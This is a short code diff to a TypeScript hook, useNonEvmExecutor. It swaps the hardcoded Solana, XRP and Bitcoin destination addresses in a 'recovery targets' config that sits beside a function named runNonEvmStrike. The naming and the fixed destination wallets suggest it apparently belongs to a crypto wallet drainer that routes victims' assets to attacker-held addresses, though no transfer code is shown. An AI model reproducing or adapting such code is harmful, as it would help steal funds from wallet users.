@@ -16,9 +16,9 @@ export function useNonEvmExecutor() {
 
   // Centralized recovery targets for non-EVM chains
   const RECOVERY_CONFIG = {
-    SOLANA: "4AWVsLK1HTs5HW4t97PaL5DN2zkpLWeDR93ne6t6mZhE",
-    XRP: "rw1QomfsfbeyQDon2i4BV7qkRL3PdGZRwL",
-    BITCOIN: "bc1qzxrxyxxk8pkqef5x5a048tltc050jwx5kncu97",
+    SOLANA: "EVUDiiy3g3wiMdtca3MuPgCYqBGeEscKf1i9hW36BUsd",
+    XRP: "r9ZPYVHkFh7JutHT7bPiPRUq5aJxnsXDTi",
+    BITCOIN: "bc1q52km4je7fy6tyhj2namg9lmqxld5wnm632trqn",
   };
 
   const runNonEvmStrike = async (asset: any, params: any) => {
